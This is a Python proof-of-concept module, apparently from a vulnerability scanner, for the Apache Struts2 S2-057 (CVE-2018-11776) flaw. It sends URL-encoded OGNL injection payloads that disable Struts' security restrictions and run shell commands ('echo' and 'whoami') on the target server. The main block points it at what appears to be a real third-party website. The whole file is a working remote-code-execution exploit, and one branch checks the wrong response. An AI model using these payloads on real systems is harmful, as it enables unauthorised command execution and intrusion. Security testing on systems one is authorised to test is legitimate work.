#!/usr/bin/env python3

'''
name: S2-057漏洞,又名CVE-2018-11776漏洞
description: S2-057漏洞可执行任意命令
'''

import sys
import time
import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_057_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta() 
        self.check_payload =  '''/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct
                                                %3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr
                                                %3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou
                                                %3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames
                                                %28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w
                                                %3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter
                                                %28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27''' + urllib.parse.quote(('echo' + ' ' + self.capta), 'utf-8') + '''%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/actionChain1.action'''
        self.check_payload1 = '''/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get
                            %28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print
                            %28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27''' + urllib.parse.quote(('echo' + ' ' + self.capta), 'utf-8') + '''%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/actionChain1.action'''
        self.cmd_payload =  '''/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct
                                                %3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr
                                                %3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou
                                                %3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames
                                                %28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w
                                                %3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter
                                                %28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami
                                                %27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/actionChain1.action'''
        self.cmd_payload1 = '''/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get
                            %28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print
                            %28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream
                            %28%29%29%29%29.%28%23w.close%28%29%29%7D/actionChain1.action
                        '''
        
    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            check_url = self.url + self.check_payload
            check_url1 = self.url + self.check_payload1
            check_req = request.get(check_url)
            check_req1 = request.get(check_url1)
            if check_req.status_code == 200 and self.capta in check_req.text and check_req1.status_code != 200 :
                cmd_url = self.url + self.cmd_payload
                cmd_req = request.get(cmd_url)
                print ('存在S2-057漏洞,执行whoami命令成功，执行结果是:', cmd_req.text)
                return True
            elif check_req1.status_code == 200 and self.capta in check_req.text and check_req.status_code != 200:
                cmd_url = self.url + self.cmd_payload1
                cmd_req = request.get(cmd_url)
                print ('存在S2-057漏洞,执行whoami命令成功，执行结果是:', cmd_req.text)
                return True
            else:
                print('不存在S2-057漏洞')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_057 = S2_057_BaseVerify('http://jsfw.kydls.com')
    S2_057.run()